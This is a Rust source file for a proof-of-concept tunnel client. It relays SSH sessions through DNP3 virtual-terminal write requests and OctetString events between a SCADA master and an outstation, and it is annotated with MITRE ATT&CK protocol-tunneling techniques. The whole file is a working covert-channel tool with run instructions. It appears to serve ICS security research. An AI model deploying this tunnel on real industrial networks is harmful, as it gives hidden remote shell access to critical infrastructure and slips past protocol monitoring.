//! PoC 3: SSH Tunnel Client over DNP3 Virtual Terminal
//!
//! Runs on the master/SCADA side. Listens on port 2222 for SSH clients, forwards
//! data via G112 (VT Output) WRITE requests to the outstation, and relays the
//! outstation's G111 (OctetString) events back to the SSH client.
//!
//! ## Usage
//!
//! ```bash
//! cargo run -p example-virtual-terminal --bin vt_tunnel_client -- --dnp3-endpoint 127.0.0.1:20000
//! # Then in another terminal:
//! ssh -p 2222 user@localhost
//! ```
//!
//! ## MITRE ATT&CK References
//! - T1572: Protocol Tunneling
//! - T1071: Application Layer Protocol
//! - T0869: Standard Application Layer Protocol (ICS)

use std::sync::Arc;
use std::time::Duration;

use dnp3::app::*;
use dnp3::decode::DecodeLevel;
use dnp3::link::*;
use dnp3::master::*;
use dnp3::tcp::*;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::{mpsc, Mutex};

/// VT port index used for the tunnel
const VT_PORT: u8 = 0;
/// Maximum bytes per G112 write (variation = data length, max 255)
const CHUNK_SIZE: usize = 240;

// ─── Read handler: receives G111 OctetString events from outstation ──────────

/// Shared sender updated per SSH session. The ReadHandler is created once
/// but sessions come and go; we swap the sender as needed.
type SharedSender = Arc<Mutex<Option<mpsc::UnboundedSender<Vec<u8>>>>>;

struct VtReadHandler {
    /// Send data received from outstation to the active SSH session.
    to_ssh_client: SharedSender,
}

impl VtReadHandler {
    fn boxed(shared: SharedSender) -> Box<dyn ReadHandler> {
        Box::new(VtReadHandler {
            to_ssh_client: shared,
        })
    }
}

impl ReadHandler for VtReadHandler {
    /// G111 OctetString events carry SSH server data from the outstation.
    fn handle_octet_string<'a>(
        &mut self,
        _info: HeaderInfo,
        iter: &'a mut dyn Iterator<Item = (&'a [u8], u16)>,
    ) {
        // This is called from an async context via block_on; using try_lock is safe.
        if let Ok(guard) = self.to_ssh_client.try_lock() {
            if let Some(ref tx) = *guard {
                for (data, _index) in iter {
                    let _ = tx.send(data.to_vec());
                }
            }
        }
    }
}

// ─── Command-line args ───────────────────────────────────────────────────────

struct Args {
    listen: String,
    dnp3_endpoint: String,
    master_addr: u16,
    outstation_addr: u16,
    poll_interval_ms: u64,
}

impl Default for Args {
    fn default() -> Self {
        Self {
            listen: "127.0.0.1:2222".into(),
            dnp3_endpoint: "127.0.0.1:20000".into(),
            master_addr: 1,
            outstation_addr: 10,
            poll_interval_ms: 100,
        }
    }
}

fn parse_args() -> Args {
    let mut args = Args::default();
    let mut argv = std::env::args().skip(1);
    while let Some(arg) = argv.next() {
        match arg.as_str() {
            "-l" | "--listen" => {
                if let Some(v) = argv.next() {
                    args.listen = v;
                }
            }
            "-d" | "--dnp3-endpoint" => {
                if let Some(v) = argv.next() {
                    args.dnp3_endpoint = v;
                }
            }
            "--master-addr" => {
                if let Some(v) = argv.next() {
                    args.master_addr = v.parse().unwrap_or(1);
                }
            }
            "--outstation-addr" => {
                if let Some(v) = argv.next() {
                    args.outstation_addr = v.parse().unwrap_or(10);
                }
            }
            "--poll-interval" => {
                if let Some(v) = argv.next() {
                    args.poll_interval_ms = v.parse().unwrap_or(100);
                }
            }
            "-h" | "--help" => {
                println!("DNP3-SSH Tunnel Client");
                println!("  -l, --listen <ADDR>          TCP listen address [default: 127.0.0.1:2222]");
                println!("  -d, --dnp3-endpoint <ADDR>   DNP3 outstation endpoint [default: 127.0.0.1:20000]");
                println!("  --master-addr <N>             DNP3 master address [default: 1]");
                println!("  --outstation-addr <N>         DNP3 outstation address [default: 10]");
                println!("  --poll-interval <MS>          Event poll interval ms [default: 100]");
                std::process::exit(0);
            }
            _ => {
                eprintln!("Unknown argument: {}", arg);
                std::process::exit(1);
            }
        }
    }
    args
}

// ─── Main ────────────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .with_target(false)
        .init();

    let args = parse_args();

    println!();
    println!("================================================================");
    println!("  PoC 3: DNP3-SSH Tunnel Client (Real DNP3)");
    println!("================================================================");
    println!("  Listen:       {}", args.listen);
    println!("  DNP3 Target:  {}", args.dnp3_endpoint);
    println!("  Master:       {}", args.master_addr);
    println!("  Outstation:   {}", args.outstation_addr);
    println!("  Poll:         {} ms", args.poll_interval_ms);
    println!();
    println!("  Connect with: ssh -p {} localhost", args.listen.split(':').last().unwrap_or("2222"));
    println!();

    // Shared channel sender for relaying outstation events to the active SSH session
    let shared_sender: SharedSender = Arc::new(Mutex::new(None));

    // Create DNP3 master channel connecting to outstation
    let mut master_cfg = MasterChannelConfig::new(EndpointAddress::try_new(args.master_addr)?);
    master_cfg.decode_level = DecodeLevel::nothing();

    let mut channel = spawn_master_tcp_client(
        LinkErrorMode::Close,
        master_cfg,
        EndpointList::new(args.dnp3_endpoint.clone(), &[]),
        ConnectStrategy::default(),
        NullListener::create(),
    );

    // Association config: frequent event polling, no time sync
    let mut assoc_cfg = AssociationConfig::new(
        EventClasses::all(),  // disable unsolicited
        EventClasses::all(),  // re-enable unsolicited after integrity
        Classes::all(),       // startup integrity
        EventClasses::none(), // don't auto-scan on IIN
    );
    assoc_cfg.auto_time_sync = None;

    let mut association = channel
        .add_association(
            EndpointAddress::try_new(args.outstation_addr)?,
            assoc_cfg,
            VtReadHandler::boxed(Arc::clone(&shared_sender)),
            Box::new(NullAssocHandler),
            Box::new(NullAssocInfo),
        )
        .await?;

    // Poll for class 1/2/3 events (OctetString events are class 1)
    association
        .add_poll(
            ReadRequest::ClassScan(Classes::class123()),
            Duration::from_millis(args.poll_interval_ms),
        )
        .await?;

    // Enable the master channel
    channel.enable().await?;

    println!("[Client] DNP3 master started, connecting to {}", args.dnp3_endpoint);

    // Listen for SSH clients
    let listener = TcpListener::bind(&args.listen).await?;
    println!("[Client] Listening for SSH connections on {}", args.listen);

    loop {
        let (ssh_stream, peer) = listener.accept().await?;
        println!("[Client] SSH client connected from {}", peer);

        let shared = Arc::clone(&shared_sender);
        let mut assoc_clone = association.clone();

        tokio::spawn(async move {
            if let Err(e) = handle_ssh_session(ssh_stream, shared, &mut assoc_clone).await {
                eprintln!("[Client] Session error: {}", e);
            }
            println!("[Client] SSH client {} disconnected", peer);
        });
    }
}

// ─── SSH Session Handler ─────────────────────────────────────────────────────

async fn handle_ssh_session(
    mut tcp: TcpStream,
    shared_sender: SharedSender,
    association: &mut AssociationHandle,
) -> Result<(), Box<dyn std::error::Error>> {
    // Create a channel for this session: outstation → SSH client
    let (from_outstation_tx, mut from_outstation_rx) = mpsc::unbounded_channel::<Vec<u8>>();

    // Register sender so the ReadHandler routes events to this session
    {
        let mut guard = shared_sender.lock().await;
        *guard = Some(from_outstation_tx);
    }

    let (mut tcp_rx, mut tcp_tx) = tcp.split();
    let mut buf = vec![0u8; 4096];

    loop {
        tokio::select! {
            // SSH client → outstation via G112 write
            result = tcp_rx.read(&mut buf) => {
                match result {
                    Ok(0) => {
                        println!("[Client] SSH client closed connection");
                        break;
                    }
                    Ok(n) => {
                        let data = buf[..n].to_vec();
                        println!("[Client] SSH client → DNP3: {} bytes", data.len());

                        // Chunk and write each piece as a G112 WRITE
                        for chunk in data.chunks(CHUNK_SIZE) {
                            if let Err(e) = association
                                .write_virtual_terminal(VT_PORT, chunk.to_vec())
                                .await
                            {
                                eprintln!("[Client] G112 write error: {}", e);
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("[Client] SSH read error: {}", e);
                        break;
                    }
                }
            }

            // Outstation G111 event → SSH client
            msg = from_outstation_rx.recv() => {
                match msg {
                    Some(data) => {
                        println!("[Client] DNP3 → SSH client: {} bytes", data.len());
                        if let Err(e) = tcp_tx.write_all(&data).await {
                            eprintln!("[Client] SSH write error: {}", e);
                            break;
                        }
                    }
                    None => break,
                }
            }
        }
    }

    // Clean up: remove sender so no more events go to the dead session
    let mut guard = shared_sender.lock().await;
    *guard = None;

    Ok(())
}

// ─── Null impls ──────────────────────────────────────────────────────────────

struct NullAssocHandler;
impl AssociationHandler for NullAssocHandler {}

struct NullAssocInfo;
impl AssociationInformation for NullAssocInfo {}
